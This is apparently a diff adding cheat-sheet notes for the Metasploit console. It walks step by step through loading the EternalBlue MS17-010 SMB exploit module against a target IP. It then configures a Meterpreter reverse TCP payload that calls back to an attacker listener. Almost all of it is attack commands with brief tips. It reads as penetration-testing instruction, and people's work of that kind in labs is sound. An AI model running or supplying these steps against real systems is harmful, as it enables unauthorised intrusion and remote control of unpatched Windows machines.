@@ -1,0 +1,22 @@
+search smb
+
+use 0                       # selects the first result (or use exploit/windows/smb/ms17_010_eternalblue)
+# or
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Now you are inside the module:
+msf6 exploit(windows/smb/ms17_010_eternalblue) >
+
+show options                # most important command – shows required/optional settings
+show payloads               # see compatible payloads
+show targets                # see supported target types (sometimes very important)
+
+set RHOSTS 192.168.1.45     # target IP (almost always required)
+set RPORT 445               # usually already set, but you can change
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.12      # your attacking machine IP
+set LPORT 4444              # listening port
+
+# Optional but very useful:
+setg RHOSTS 10.10.10.50     # global set → applies to all future modules
+unset RHOSTS                # remove setting
